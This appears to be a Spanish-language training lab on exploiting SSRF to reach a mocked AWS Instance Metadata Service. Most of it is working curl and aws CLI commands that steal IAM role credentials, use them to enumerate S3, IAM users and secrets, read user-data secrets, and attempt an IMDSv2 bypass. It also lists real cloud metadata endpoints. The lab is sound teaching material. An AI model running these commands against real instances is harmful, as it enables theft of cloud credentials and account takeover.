# Lab 03 — IMDS Exploitation via SSRF

## Objetivo

Explotar una vulnerabilidad SSRF en una aplicación web para acceder al Instance Metadata Service (IMDS) de AWS y robar credenciales IAM temporales del rol de la instancia EC2.

**SSRF App:** `http://localhost:8181/?url=`
**IMDS Mock:** `http://cloud-imds` (interno) / `http://localhost:8169` (host)

---

## ¿Qué es IMDS?

El Instance Metadata Service (IMDS) responde en `http://169.254.169.254` y proporciona a las instancias EC2 información sobre sí mismas: ID, región, credenciales IAM del rol asignado.

```
EC2 Instance → GET http://169.254.169.254/latest/meta-data/iam/security-credentials/rol
            ← {AccessKeyId, SecretAccessKey, Token, Expiration}
```

Si una aplicación web en esa instancia tiene SSRF, el atacante puede hacer:

```
Atacante → SSRF en app → 169.254.169.254 → credenciales IAM del rol EC2
```

---

## Parte 1 — Confirmar la SSRF

```bash
# La app recibe una URL y hace fetch del contenido
# Primero, confirmar que funciona con una URL externa
curl "http://localhost:8181/?url=http://example.com" | head -5

# Confirmar SSRF a servicio interno
curl "http://localhost:8181/?url=http://cloud-imds/"

# En un escenario real, 169.254.169.254 sería el objetivo
# En el lab, cloud-imds simula ese servicio
```

---

## Parte 2 — Navegar el IMDS

```bash
BASE="http://localhost:8181/?url=http://cloud-imds"

# Raíz de metadatos
curl -s "${BASE}/latest/meta-data/"

# Instance ID
curl -s "${BASE}/latest/meta-data/instance-id"

# IP privada
curl -s "${BASE}/latest/meta-data/local-ipv4"

# Verificar si hay un rol IAM asignado
curl -s "${BASE}/latest/meta-data/iam/"
curl -s "${BASE}/latest/meta-data/iam/info"

# Listar roles disponibles
curl -s "${BASE}/latest/meta-data/iam/security-credentials/"
```

---

## Parte 3 — Robar credenciales IAM

```bash
# Obtener nombre del rol
ROLE=$(curl -s "${BASE}/latest/meta-data/iam/security-credentials/")
echo "Rol encontrado: $ROLE"

# Obtener credenciales temporales del rol
curl -s "${BASE}/latest/meta-data/iam/security-credentials/${ROLE}" \
    | python3 -m json.tool
```

**Resultado:**

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA1234567890ABCDEF",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2026-12-31T23:59:59Z"
}
```

---

## Parte 4 — Usar las credenciales robadas

```bash
# Exportar credenciales obtenidas via SSRF
export AWS_ACCESS_KEY_ID=ASIA1234567890ABCDEF
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoDYXdzEJr...

# Verificar identidad
aws sts get-caller-identity \
    --endpoint-url http://localhost:4566

# Listar recursos accesibles con el rol ec2-prod-role
aws s3 ls --endpoint-url http://localhost:4566
aws iam list-users --endpoint-url http://localhost:4566
aws secretsmanager list-secrets --endpoint-url http://localhost:4566
```

---

## Parte 5 — User-data: otro vector

```bash
# Los datos de inicialización de la instancia pueden contener secretos
curl -s "${BASE}/latest/user-data"

# Output:
# #!/bin/bash
# export DB_PASSWORD=SuperSecret2026!
# export API_KEY=sk-prod-abc123xyz
```

---

## Parte 6 — IMDSv2 como mitigación

IMDSv2 requiere un token previo antes de consultar los metadatos, previniendo SSRF simple:

```bash
# IMDSv2 — requiere PUT primero para obtener token
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Luego usar el token en cada consulta
curl -s "http://169.254.169.254/latest/meta-data/" \
    -H "X-aws-ec2-metadata-token: $TOKEN"
```

**Por qué protege contra SSRF:**
- SSRF típica solo hace GET — no puede hacer el PUT previo
- Sin token → IMDS devuelve 401

**Cómo bypassear IMDSv2 si la SSRF permite headers personalizados:**
```bash
# Si la app vulnerable redirige headers del cliente al destino
curl "http://ssrf-app/?url=http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT
```

---

## Parte 7 — SSRF a servicios cloud internos (AWS reales)

```
# En entornos AWS reales, desde SSRF también se puede acceder a:
http://169.254.169.254/latest/meta-data/             ← EC2 metadata
http://169.254.170.2/v2/credentials                  ← ECS task credentials
http://100.100.100.200/latest/meta-data/              ← Alibaba Cloud
http://metadata.google.internal/computeMetadata/v1/  ← GCP (requiere header)
http://169.254.169.254/metadata/v1/                  ← Azure IMDS (requiere header)
```

---

## Actividades

1. Confirmar SSRF en `http://localhost:8181` y obtener el Instance ID
2. Navegar el árbol de metadatos completo via SSRF
3. Robar las credenciales IAM temporales del rol ec2-prod-role
4. Usar esas credenciales para listar todos los recursos del entorno LocalStack
5. Leer el `user-data` y documentar los secretos encontrados
6. Explicar por qué IMDSv2 mitiga este ataque y cómo podría bypassearse

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| Unsecured Credentials — Cloud Instance Metadata API | T1552.005 |
| Server-Side Request Forgery | T1190 |
| Steal Application Access Token | T1528 |
